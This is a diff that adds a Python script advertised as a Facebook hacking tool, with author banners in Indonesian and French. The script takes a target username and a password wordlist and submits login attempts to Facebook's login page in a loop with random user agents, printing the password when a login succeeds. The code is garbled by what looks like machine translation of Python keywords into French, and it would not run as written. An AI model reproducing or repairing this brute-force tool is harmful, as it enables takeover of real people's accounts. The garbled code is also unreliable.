@@ -1,0 +1,359 @@
+# ! usr
+
+# - * - codage: UTF-8 - * -
+
+# Mod par: iqbalz noobs
+
+# équipe: la vie du programmeur
+
+
+
+importation os
+
+système d' importation
+
+temps d' importation
+
+importer au hasard
+
+importer cookielib
+
+importer mécaniser
+
+
+wd = " \ 033 [90; 1m " # dark
+
+GL = " \ 033 [96; 1m " # bleu aqua
+
+BB = " \ 033 [34; 1m " # lumière bleue
+
+YY = " \ 033 [33; 1m " # Feu jaune
+
+GG = " \ 033 [32; 1m " # Feu vert
+
+WW = " \ 033 [0; 1m " # Lumière blanche
+
+RR = " \ 033 [31; 1m " # Feu rouge
+
+CC = " \ 033 [36; 1m " # lumière cyan
+
+B = " \ 033 [34m " # Bleu
+
+Y = " \ 033 [33; 1m " # Jaune
+
+G = " \ 033 [32m " # Vert
+
+W = " \ 033 [0; 1m " # Blanc
+
+R = " \ 033 [31m " # Rouge
+
+C = " \ 033 [36; 1m " # Cyan
+
+
+def runntxt ( s ):
+
+        pour noobs à s + ' \ n ' :
+
+                sys.stdout.write (noobs)
+
+                sys.stdout.flush ()
+
+                time.sleep ( 10 . / 2100 )
+
+
+
+def bannière ():
+
+    os.system ( ' clear ' )
+
+    imprimer " "
+
+    runntxt ( GL + " Assalamu '@ laikum. ^ _ ^ " )
+
+    runntxt ( WW + " ___ _ _ _ __ " )
+
+    runntxt ( WW + " | _ _ | __ _ | | __ __ _ | | ____ | | __ / _ | " )
+
+    runntxt ( GL + " | | _ _ | | '_ \ / _` | | _ / |' _ \ | | _ " )
+
+    runntxt ( GG + " | | (_ | | | _) | (_ | | | / / _ | | _) | _ | " )
+
+    runntxt (Y + " | ___ \ __, | _.__ / \ __, _ | _ / ___ / ___ | _.__ / | _ | " )
+
+    runntxt ( GG + " | _ | " )
+
+    temps.sommeil ( 1.5 )
+
+    print GG + " √ =========================================== √ "
+
+    print GL + " | •••••• NOUVEAUX OUTILS HACK FACEBOOK BF. •••••• | "
+
+    print GG + " √ =========================================== √ "
+
+    print WW + " | MOD DE: Ben mahmoud mouad| "
+
+    impression GL + " | Berdoa Dulu Sebelum Menggunakan | "
+
+    print WW + " | FACEBOOK: Iqbalznoobs | "
+
+    print Y + " | INSTAGRAM: mouad 123| "
+
+    print GL + " | ------------------------------------------------- | "
+
+    print GL + " | VIE DU PROGRAMMEUR [LOP] | "
+
+    print GL + " | ------------------------------------------------- | "
+
+    print GG + " √ =========================================== √ "
+
+    print GL + " | •••••••••• HACK FACEBOOK MAS ^ _ ^ •••••••••• | "
+
+    print GG + " √ =========================================== √ "
+
+
+bannière()
+
+
+print wd + " https://www.github.com/IqbalzNoobs "
+
+print GG + " ╭──── \ 033 [91m [ \ 033 [96m Masukkan ID \ 033 [95m / \ 033 [96mUsername Target \ 033 [91m] "
+
+email_target = str ( raw_input ( GL + " \ 033 [92m╰────➲ \ 033 [93m " )))
+
+imprimer " "
+
+print " \ 033 [92m╭──── \ 033 [91m [ \ 033 [96mMasukkan Wordlist Fichier \ 033 [95m (pass.txt) \ 033 [91, 1 m] "
+
+password_list = str ( raw_input ( GG + " ╰────➲ \ 033 [93m " ))
+
+login = ' https://www.facebook.com/login.php?login_attempt=1 '
+
+useragents = [( ' Mozilla / 5.0 (X11; Linux x86_64; vr: 45.0) Gecko / 20100101 Firefox / 45.0 ' , ' Mozilla / 5.0 (X11; U; Linux i686; fr-FR; 1.9.0.1) Geck ' )]
+
+# useragents = [('Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 60.0.3112.113 Safari / 537.36', 'Mozilla / 5.0 (Windows NT 6.1; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 60.0.3112.90 Safari / 537.36 ',' Mozilla / 5.0 (Windows NT 5.1; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 60.0.3112.90 Safari / 537.36 ' , 'Mozilla / 5.0 (Windows NT 6.2; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 60.0.3112.90 Safari / 537.36', 'Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, similaire) Gecko) Chrome / 44.0.2403.157 Safari / 537.36 ',' Mozilla / 5.0 (Windows NT 6.3; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 60.0.3112.113 Safari / 537.36 ',' Mozilla / 5.0 (Windows) NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 57.0.2987.133 Safari / 537.36 ',' Mozilla / 5.0 (Windows NT 6.1; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 57.0.2987.133 Safari / 537.36 ',' Mozilla / 5.0 (Windows NT 10.0; Win64; x64 ) AppleWebKit / 537.36 (KHTML, comme Gecko) Chrome / 55.0.2883.87 Safari / 537.36 ',' Mozilla / 5.0 (Windows NT 6.1; Win64; x64) AppleWebKit / 537.36 (KHTML, comme Gecko), Chrome / 55.0.2883.87 Safari / 537.36. ',]]
+
+
+def pil ():
+
+                imprimer GG + " "
+
+                g = str ( raw_input ( " [?] Hack Fb lagi .. \ 033 [93; 1m [y / n]: " ))
+
+                si g == ' y ' ou g == ' Y ' :
+
+                    os.system ( ' python2 brute.py ' )
+
+                elif g == ' n ' ou g == ' N ' :
+
+                    print wd + " Programme Keluar dari ... "
+
+                    sys.exit ()
+
+                sinon :
+
+                    imprimer RR + " Pilih yang bener cuk ... "
+
+                    pil ()
+
+
+def edit_wordlist ():
+
+
+        imprimer GG + " "
+
+        ed = str ( raw_input ( " [?] Modifier la liste de mots cuk.? \ 033 [96; 1m [y / n]: " ))
+
+        si ed == ' y ' ou ed == ' Y ' :
+
+                os.system ( ' nano ' + password_list)
+
+                pil ()
+
+        elif ed == ' n ' ou ed == ' N ' :
+
+                print wd + " Programme Keluar Dari ... "
+
+                sys.exit ()
+
+
+        sinon :
+
+                imprimer RR + " Pilih yg bener cuk ... "
+
+                edit_wordlist ()
+
+
+def main ():
+
+        noobs globaux
+
+        noobs = mechanize.Browser ()
+
+        cj = cookielib.LWPCookieJar ()
+
+        noobs.set_handle_robots ( False )
+
+        noobs.set_handle_redirect ( True )
+
+        noobs.set_cookiejar (cj)
+
+        noobs.set_handle_equiv ( True )
+
+        noobs.set_handle_referer ( True )
+
+        noobs.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1 )
+
+        runn_noobs ()
+
+        la vie()
+
+        imprimer " "
+
+        imprimer RR + "liste de mots tidak ada yg cocok ... "
+
+        imprimer " "
+
+def iqbalz ( iqbalz_password ):
+
+  essayez :
+
+ 	sys.stdout.write ( GG + " \ n [ \ 033 [91m + \ 033 [92m] \ 033 [91; 1m [ \ 033 [97m ". + email_target + " ] 033 [91m] \ 033 [90m Mencoba ==> \ 033 [91m [ \ 033 [90; 1m " + iqbalz_password)
+
+	sys.stdout.flush ()
+
+	noobs.addheaders = [( ' User-agent ' , random.choice (useragents))]
+
+	site = noobs.open (login)
+
+	noobs.select_form ( nr = 0 )
+
+	noobs.form [ ' email ' ] = email_target
+
+	noobs.form [ ' pass ' ] = iqbalz_password
+
+	tom = noobs.submit ()
+
+	masque = tom.geturl ()
+
+	Si mask ! = login et ( pas ' login_attempt ' dans mask):
+
+                        imprimer " "
+
+			print ( " \ 033 [96m SUCCESS " )
+
+			print " MOT DE PASSE "
+
+                  	print RR + " + ------------------------------------------- + "
+
+	 	print ( RR + " # \ 033 [97m ID / Cible Email: \ 033 [92m {} " ) .format (email_target)
+
+        	 print ( RR + " # \ 033 [97m Cible du mot de passe: \ 033 [92m {} " ) .format (iqbalz_password)
+
+        	 imprimer " "
+
+        	 raw_input ( WW + " TEKAN ENTER UNTUK KELUAR ... " )
+
+			sys.exit ( 1 )
+
+  
+
+  
+
+  sauf KeyboardInterrupt :
+
+      print wd + " Stop ....... "
+
+      edit_wordlist ()
+
+      sys.exit () 	 
+
+def life ():
+
+	mot de passe iqbalz global
+
+	password_nob = open (password_list, " r " )
+
+	pour iqbalz_password dans password_nob:
+
+		password_nob = iqbalz_password.replace ( " \ n " , " " )
+
+		iqbalz (iqbalz_password)		
+
+
+def runn_noobs ():
+
+         global password_list
+
+
+         lop = GG + "" "
+
+`.-: //////: -.`
+
+.: + o +: - .. `` `` ..-: + o + :.
+
+`: o + -``: + o: `
+
+`/ o:` `: o /`
+
+-s / `.- ..` `..--` `/ s-
+
+/ o. `: .`: ----------: -.` `: - .o /
+
+/ o`.: `` - `o /
+
+-s. .: `- .s-
+
+o /.: `- + o
+
+.s-:. `:` -s`
+
+.s. : `:` .s.
+
+.s- -.: -s.
+
+o / `-. `-. / o
+
+-s. `-` `.-` .s-
+
+/ o` ---- `` .. .. .. `` ...--. `` o /
+
+/ o. `----` `-. `-. .o /
+
+-o: -....... .. `: o-
+
+`: o:` `.....-- ..`: o: `
+
+`: +/-` `- ..` - / +: `
+
+`- / + /// ..` `` `..: // + / -`
+
+`.- :: //// :: -.` \ 033 [91; 1m
+
+\ 033 [90; 1mVie du programmeur \ 033 [91; 1m
+
+Propulsé par: \ 033 [97m Iqbalz Noobs
+
+"" "
+
+
+
+         lop d' impression
+
+         nuub = open (password_list, ' r ' )
+
+         nuub = nuub.readlines ()
+
+         print wd + " [#] ID / nom d'utilisateur cible \ 033 [97; 1m: {} " .format (email_target)
+
+         print wd + " [#] JUmlah Mot de passe saat ini \ 033 [97; 1m: " , len (nuub), ' mot de passe '
+
+         print wd + " [#] Proses Tunggu Craquelant \ 033 [97; 1m .......... "
+
+         imprimer " "
+
+
+si __name__ == ' __main__ ' :
+
+	principale()	
+
+
